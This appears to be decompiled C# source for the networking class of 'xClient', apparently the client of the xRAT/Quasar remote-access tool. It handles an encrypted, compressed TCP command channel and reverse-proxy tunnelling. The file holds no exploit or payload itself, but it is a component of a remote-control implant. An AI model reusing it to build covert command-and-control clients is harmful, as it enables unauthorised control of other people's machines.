using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using xClient.Core.Commands;
using xClient.Core.Compression;
using xClient.Core.Cryptography;
using xClient.Core.Extensions;
using xClient.Core.NetSerializer;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.Networking;

public class Client
{
	public delegate void ClientFailEventHandler(Client s, Exception ex);

	public delegate void ClientStateEventHandler(Client s, bool connected);

	public delegate void ClientReadEventHandler(Client s, IPacket packet);

	public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

	public enum ReceiveType
	{
		Header,
		Payload
	}

	private Socket _handle;

	private List<ReverseProxyClient> _proxyClients;

	private readonly object _proxyClientsLock = new object();

	private byte[] _readBuffer;

	private byte[] _payloadBuffer;

	private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();

	private bool _sendingPackets;

	private readonly object _sendingPacketsLock = new object();

	private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

	private bool _readingPackets;

	private readonly object _readingPacketsLock = new object();

	private byte[] _tempHeader;

	private bool _appendHeader;

	private int _readOffset;

	private int _writeOffset;

	private int _tempHeaderOffset;

	private int _readableDataLen;

	private int _payloadLen;

	private ReceiveType _receiveState;

	private const bool encryptionEnabled = true;

	private const bool compressionEnabled = true;

	public int BUFFER_SIZE => 16384;

	public uint KEEP_ALIVE_TIME => 25000u;

	public uint KEEP_ALIVE_INTERVAL => 25000u;

	public int HEADER_SIZE => 4;

	public int MAX_PACKET_SIZE => 5242880;

	public ReverseProxyClient[] ProxyClients
	{
		get
		{
			lock (_proxyClientsLock)
			{
				return _proxyClients.ToArray();
			}
		}
	}

	public bool Connected { get; private set; }

	protected Serializer Serializer { get; set; }

	public event ClientFailEventHandler ClientFail;

	public event ClientStateEventHandler ClientState;

	public event ClientReadEventHandler ClientRead;

	public event ClientWriteEventHandler ClientWrite;

	private void OnClientFail(Exception ex)
	{
		this.ClientFail?.Invoke(this, ex);
	}

	private void OnClientState(bool connected)
	{
		if (Connected != connected)
		{
			Connected = connected;
			this.ClientState?.Invoke(this, connected);
		}
	}

	private void OnClientRead(IPacket packet)
	{
		this.ClientRead?.Invoke(this, packet);
	}

	private void OnClientWrite(IPacket packet, long length, byte[] rawData)
	{
		this.ClientWrite?.Invoke(this, packet, length, rawData);
	}

	protected Client()
	{
		_proxyClients = new List<ReverseProxyClient>();
		_readBuffer = new byte[BUFFER_SIZE];
		_tempHeader = new byte[HEADER_SIZE];
	}

	protected void Connect(IPAddress ip, ushort port)
	{
		try
		{
			Disconnect();
			_handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			_handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
			_handle.Connect(ip, port);
			if (_handle.Connected)
			{
				_handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
				OnClientState(connected: true);
			}
		}
		catch (Exception ex)
		{
			OnClientFail(ex);
		}
	}

	private void AsyncReceive(IAsyncResult result)
	{
		int num;
		try
		{
			num = _handle.EndReceive(result);
			if (num <= 0)
			{
				throw new Exception("no bytes transferred");
			}
		}
		catch (NullReferenceException)
		{
			return;
		}
		catch (ObjectDisposedException)
		{
			return;
		}
		catch (Exception)
		{
			Disconnect();
			return;
		}
		byte[] array = new byte[num];
		try
		{
			Array.Copy(_readBuffer, array, array.Length);
		}
		catch (Exception ex4)
		{
			OnClientFail(ex4);
			return;
		}
		lock (_readBuffers)
		{
			_readBuffers.Enqueue(array);
		}
		lock (_readingPacketsLock)
		{
			if (!_readingPackets)
			{
				_readingPackets = true;
				ThreadPool.QueueUserWorkItem(AsyncReceive);
			}
		}
		try
		{
			_handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
		}
		catch (ObjectDisposedException)
		{
		}
		catch (Exception ex6)
		{
			OnClientFail(ex6);
		}
	}

	private void AsyncReceive(object state)
	{
		while (true)
		{
			byte[] array;
			lock (_readBuffers)
			{
				if (_readBuffers.Count == 0)
				{
					lock (_readingPacketsLock)
					{
						_readingPackets = false;
						break;
					}
				}
				array = _readBuffers.Dequeue();
			}
			_readableDataLen += array.Length;
			bool flag = true;
			while (flag)
			{
				int num;
				switch (_receiveState)
				{
				case ReceiveType.Payload:
				{
					if (_payloadBuffer == null || _payloadBuffer.Length != _payloadLen)
					{
						_payloadBuffer = new byte[_payloadLen];
					}
					int num2 = ((_writeOffset + _readableDataLen >= _payloadLen) ? (_payloadLen - _writeOffset) : _readableDataLen);
					try
					{
						Array.Copy(array, _readOffset, _payloadBuffer, _writeOffset, num2);
					}
					catch (Exception ex4)
					{
						flag = false;
						OnClientFail(ex4);
						break;
					}
					_writeOffset += num2;
					_readOffset += num2;
					_readableDataLen -= num2;
					if (_writeOffset == _payloadLen)
					{
						bool flag2;
						if (!(flag2 = _payloadBuffer.Length == 0))
						{
							_payloadBuffer = AES.Decrypt(_payloadBuffer);
							flag2 = _payloadBuffer.Length == 0;
						}
						if (!flag2)
						{
							try
							{
								_payloadBuffer = SafeQuickLZ.Decompress(_payloadBuffer);
							}
							catch (Exception)
							{
								flag = false;
								Disconnect();
								break;
							}
							flag2 = _payloadBuffer.Length == 0;
						}
						if (flag2)
						{
							flag = false;
							Disconnect();
							break;
						}
						using (MemoryStream stream = new MemoryStream(_payloadBuffer))
						{
							try
							{
								IPacket packet = (IPacket)Serializer.Deserialize(stream);
								OnClientRead(packet);
							}
							catch (Exception ex6)
							{
								flag = false;
								OnClientFail(ex6);
								break;
							}
						}
						_receiveState = ReceiveType.Header;
						_payloadBuffer = null;
						_payloadLen = 0;
						_writeOffset = 0;
					}
					if (_readableDataLen == 0)
					{
						flag = false;
					}
					break;
				}
				case ReceiveType.Header:
					{
						if (_readableDataLen + _tempHeaderOffset >= HEADER_SIZE)
						{
							num = (_appendHeader ? (HEADER_SIZE - _tempHeaderOffset) : HEADER_SIZE);
							try
							{
								if (_appendHeader)
								{
									try
									{
										Array.Copy(array, _readOffset, _tempHeader, _tempHeaderOffset, num);
									}
									catch (Exception ex)
									{
										flag = false;
										OnClientFail(ex);
										goto end_IL_026d;
									}
									_payloadLen = BitConverter.ToInt32(_tempHeader, 0);
									_tempHeaderOffset = 0;
									_appendHeader = false;
								}
								else
								{
									_payloadLen = BitConverter.ToInt32(array, _readOffset);
								}
								if (_payloadLen <= 0 || _payloadLen > MAX_PACKET_SIZE)
								{
									throw new Exception("invalid header");
								}
								goto IL_0308;
								end_IL_026d:;
							}
							catch (Exception)
							{
								flag = false;
								Disconnect();
							}
						}
						else
						{
							try
							{
								Array.Copy(array, _readOffset, _tempHeader, _tempHeaderOffset, _readableDataLen);
							}
							catch (Exception ex3)
							{
								flag = false;
								OnClientFail(ex3);
								break;
							}
							_tempHeaderOffset += _readableDataLen;
							_appendHeader = true;
							flag = false;
						}
						break;
					}
					IL_0308:
					_readableDataLen -= num;
					_readOffset += num;
					_receiveState = ReceiveType.Payload;
					break;
				}
			}
			if (_receiveState == ReceiveType.Header)
			{
				_writeOffset = 0;
			}
			_readOffset = 0;
			_readableDataLen = 0;
		}
	}

	public void Send<T>(T packet) where T : IPacket
	{
		if (!Connected || packet == null)
		{
			return;
		}
		lock (_sendBuffers)
		{
			using MemoryStream memoryStream = new MemoryStream();
			try
			{
				Serializer.Serialize(memoryStream, packet);
			}
			catch (Exception ex)
			{
				OnClientFail(ex);
				return;
			}
			byte[] array = memoryStream.ToArray();
			_sendBuffers.Enqueue(array);
			OnClientWrite(packet, array.LongLength, array);
			lock (_sendingPacketsLock)
			{
				if (_sendingPackets)
				{
					return;
				}
				_sendingPackets = true;
			}
			ThreadPool.QueueUserWorkItem(Send);
		}
	}

	public void SendBlocking<T>(T packet) where T : IPacket
	{
		Send(packet);
		while (_sendingPackets)
		{
			Thread.Sleep(10);
		}
	}

	private void Send(object state)
	{
		while (Connected)
		{
			byte[] payload;
			lock (_sendBuffers)
			{
				if (_sendBuffers.Count == 0)
				{
					SendCleanup();
					return;
				}
				payload = _sendBuffers.Dequeue();
			}
			try
			{
				_handle.Send(BuildPacket(payload));
			}
			catch (Exception ex)
			{
				OnClientFail(ex);
				SendCleanup(clear: true);
				return;
			}
		}
		SendCleanup(clear: true);
	}

	private byte[] BuildPacket(byte[] payload)
	{
		payload = SafeQuickLZ.Compress(payload);
		payload = AES.Encrypt(payload);
		byte[] array = new byte[payload.Length + HEADER_SIZE];
		Array.Copy(BitConverter.GetBytes(payload.Length), array, HEADER_SIZE);
		Array.Copy(payload, 0, array, HEADER_SIZE, payload.Length);
		return array;
	}

	private void SendCleanup(bool clear = false)
	{
		lock (_sendingPacketsLock)
		{
			_sendingPackets = false;
		}
		if (!clear)
		{
			return;
		}
		lock (_sendBuffers)
		{
			_sendBuffers.Clear();
		}
	}

	public void Disconnect()
	{
		if (_handle != null)
		{
			_handle.Close();
			_handle = null;
			_readOffset = 0;
			_writeOffset = 0;
			_tempHeaderOffset = 0;
			_readableDataLen = 0;
			_payloadLen = 0;
			_payloadBuffer = null;
			_receiveState = ReceiveType.Header;
			if (_proxyClients != null)
			{
				lock (_proxyClientsLock)
				{
					try
					{
						foreach (ReverseProxyClient proxyClient in _proxyClients)
						{
							proxyClient.Disconnect();
						}
					}
					catch (Exception)
					{
					}
				}
			}
			if (CommandHandler.StreamCodec != null)
			{
				CommandHandler.StreamCodec.Dispose();
				CommandHandler.StreamCodec = null;
			}
		}
		OnClientState(connected: false);
	}

	public void ConnectReverseProxy(ReverseProxyConnect command)
	{
		lock (_proxyClientsLock)
		{
			_proxyClients.Add(new ReverseProxyClient(command, this));
		}
	}

	public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
	{
		lock (_proxyClientsLock)
		{
			return _proxyClients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
		}
	}

	public void RemoveProxyClient(int connectionId)
	{
		try
		{
			lock (_proxyClientsLock)
			{
				int num = 0;
				while (true)
				{
					if (num < _proxyClients.Count)
					{
						if (_proxyClients[num].ConnectionId == connectionId)
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				_proxyClients.RemoveAt(num);
			}
		}
		catch
		{
		}
	}
}
